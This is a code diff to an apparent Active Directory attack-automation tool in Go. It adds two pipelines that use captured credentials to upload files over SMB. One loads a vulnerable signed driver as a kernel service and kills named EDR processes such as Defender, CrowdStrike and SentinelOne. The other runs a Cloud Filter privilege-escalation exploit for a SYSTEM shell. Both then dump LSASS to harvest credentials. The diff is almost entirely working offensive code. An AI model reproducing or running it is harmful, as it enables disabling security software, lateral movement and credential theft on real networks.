@@ -83,6 +83,22 @@ var acquisitionPipelines = map[string]PipelineDef{
 		ParseFn:     parseMimikatzOutput,
 		Description: "Upload FunnyApp.exe, exploit Defender RPC to leak SAM via VSS, extract hashes",
 	},
+	"phantomkiller": {
+		Name:        "phantomkiller",
+		Delivery:    "exe",
+		PayloadType: "phantomkiller",
+		RemoteExec:  true,
+		ParseFn:     parseNanodumpOutput,
+		Description: "Upload BootRepair.sys + PhantomKiller.exe via SMB, load signed Lenovo driver, kill EDR processes via IOCTL, dump LSASS",
+	},
+	"miniplasma": {
+		Name:        "miniplasma",
+		Delivery:    "exe",
+		PayloadType: "miniplasma",
+		RemoteExec:  true,
+		ParseFn:     parseMimikatzOutput,
+		Description: "Upload MiniPlasma.exe, exploit Cloud Filter API race condition for SYSTEM shell, dump LSASS",
+	},
 }
 
 type PipelineDef struct {
@@ -143,6 +159,10 @@ func RunCredentialAcq(state *core.ADState, profileName string, targetHost string
 		return executeUnDefendPipeline(state, host, pipeline)
 	case "bluehammer":
 		return executeBlueHammerPipeline(state, host, pipeline)
+	case "phantomkiller":
+		return executePhantomKillerPipeline(state, host, pipeline)
+	case "miniplasma":
+		return executeMiniPlasmaPipeline(state, host, pipeline)
 	default:
 		return executeMimikatzPipeline(state, host, pipeline)
 	}
@@ -774,6 +794,153 @@ func sanitizeMimikatzCommand(cmd string) string {
 		}
 	}
 	return string(safe)
+}
+
+func executePhantomKillerPipeline(state *core.ADState, host core.Host, pipeline PipelineDef) *core.ToolResult {
+	result := &core.ToolResult{Success: true}
+	domain, user, pass, hash := getCredential(state)
+
+	if domain == "" || pass == "" {
+		fmt.Println("[!] No credentials for PhantomKiller pipeline")
+		result.Success = false
+		result.Evidence = append(result.Evidence, core.EvidenceEntry{
+			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
+			Source: "phantomkiller", Key: "error",
+			Value: "no credentials",
+			Timestamp: time.Now(),
+		})
+		return result
+	}
+
+	target := tools.NetExecTarget{
+		Protocol: "smb", Host: host.IP,
+		Domain: domain, Username: user, Password: pass, Hash: hash,
+	}
+
+	if !tools.PhantomKiller.Available() {
+		fmt.Println("[!] PhantomKiller not available, falling back to nanodump")
+		return executeNanodumpPipeline(state, host, pipeline)
+	}
+
+	ctx := context.Background()
+	fmt.Println("[*] PhantomKiller: Uploading BootRepair.sys via SMB...")
+	uploadDriver, err := tools.NetExec.PutFile(ctx, target, "BootRepair.sys", `C:\Windows\Temp\`)
+	if err != nil || !uploadDriver.Success {
+		fmt.Println("[!] Failed to upload BootRepair.sys")
+		result.Success = false
+		result.Evidence = append(result.Evidence, core.EvidenceEntry{
+			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
+			Source: "phantomkiller", Key: "error",
+			Value: "failed to upload BootRepair.sys",
+			Timestamp: time.Now(),
+		})
+		return result
+	}
+
+	fmt.Println("[*] PhantomKiller: Uploading PhantomKiller.exe via SMB...")
+	uploadExe, err := tools.NetExec.PutFile(ctx, target, "PhantomKiller.exe", `C:\Windows\Temp\`)
+	if err != nil || !uploadExe.Success {
+		fmt.Println("[!] Failed to upload PhantomKiller.exe")
+		result.Success = false
+		result.Evidence = append(result.Evidence, core.EvidenceEntry{
+			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
+			Source: "phantomkiller", Key: "error",
+			Value: "failed to upload PhantomKiller.exe",
+			Timestamp: time.Now(),
+		})
+		return result
+	}
+
+	fmt.Println("[*] PhantomKiller: Loading kernel driver...")
+	loadCmd := `sc.exe create PhantomKiller binPath="C:\Windows\Temp\BootRepair.sys" type=kernel && sc.exe start PhantomKiller`
+	loadR, err := tools.NetExec.Run(ctx, target, "-x", []string{loadCmd})
+	if err != nil || !loadR.Success {
+		fmt.Println("[!] Failed to load PhantomKiller driver")
+		result.Success = false
+		result.Evidence = append(result.Evidence, core.EvidenceEntry{
+			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
+			Source: "phantomkiller", Key: "error",
+			Value: "failed to load driver",
+			Timestamp: time.Now(),
+		})
+		return result
+	}
+
+	fmt.Println("[*] PhantomKiller: Enumerating EDR processes...")
+	edrPids := []string{"MsMpEng.exe", "CSFalconService.exe", "SentinelService.exe", "CylanceSvc.exe",
+		"SophosMgr.exe", "TaniumClient.exe", "CarbonBlack.exe", "CrowdStrike.exe", "McAfee.exe", "Symantec.exe"}
+	for _, proc := range edrPids {
+		killCmd := fmt.Sprintf(`tasklist /FI "IMAGENAME eq %s" 2>NUL | find /I "%s" >NUL && C:\Windows\Temp\PhantomKiller.exe`, proc, proc)
+		tools.NetExec.Run(ctx, target, "-x", []string{killCmd})
+	}
+
+	fmt.Println("[*] PhantomKiller: Dumping LSASS with nanodump...")
+	dump := executeNanodumpPipeline(state, host, pipeline)
+	if dump.Success {
+		result.Evidence = append(result.Evidence, dump.Evidence...)
+	}
+
+	return result
+}
+
+func executeMiniPlasmaPipeline(state *core.ADState, host core.Host, pipeline PipelineDef) *core.ToolResult {
+	result := &core.ToolResult{Success: true}
+	domain, user, pass, hash := getCredential(state)
+
+	if domain == "" || pass == "" {
+		fmt.Println("[!] No credentials for MiniPlasma pipeline")
+		result.Success = false
+		result.Evidence = append(result.Evidence, core.EvidenceEntry{
+			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
+			Source: "miniplasma", Key: "error",
+			Value: "no credentials",
+			Timestamp: time.Now(),
+		})
+		return result
+	}
+
+	target := tools.NetExecTarget{
+		Protocol: "smb", Host: host.IP,
+		Domain: domain, Username: user, Password: pass, Hash: hash,
+	}
+
+	if !tools.MiniPlasma.Available() {
+		fmt.Println("[!] MiniPlasma not available, falling back to nanodump")
+		return executeNanodumpPipeline(state, host, pipeline)
+	}
+
+	ctx := context.Background()
+	fmt.Println("[*] MiniPlasma: Uploading exploit via SMB...")
+	upload, err := tools.NetExec.PutFile(ctx, target, "MiniPlasma.exe", `C:\Windows\Temp\`)
+	if err != nil || !upload.Success {
+		fmt.Println("[!] Failed to upload MiniPlasma.exe")
+		result.Success = false
+		result.Evidence = append(result.Evidence, core.EvidenceEntry{
+			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
+			Source: "miniplasma", Key: "error",
+			Value: "failed to upload MiniPlasma.exe",
+			Timestamp: time.Now(),
+		})
+		return result
+	}
+
+	fmt.Println("[*] MiniPlasma: Executing Cloud Filter EoP exploit for SYSTEM shell...")
+	execR, err := tools.NetExec.Run(ctx, target, "-x", []string{`C:\Windows\Temp\MiniPlasma.exe`})
+	if err == nil && execR.Success {
+		fmt.Println("[+] MiniPlasma: SYSTEM shell obtained, dumping LSASS...")
+		dump := executeNanodumpPipeline(state, host, pipeline)
+		if dump.Success {
+			result.Evidence = append(result.Evidence, dump.Evidence...)
+		}
+		result.Evidence = append(result.Evidence, core.EvidenceEntry{
+			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
+			Source: "miniplasma", Key: "eop",
+			Value: "MiniPlasma SYSTEM shell achieved",
+			Confidence: 0.7, RawOutput: execR.Stdout,
+			Timestamp: time.Now(),
+		})
+	}
+	return result
 }
 
 func isNumeric(s string) bool {
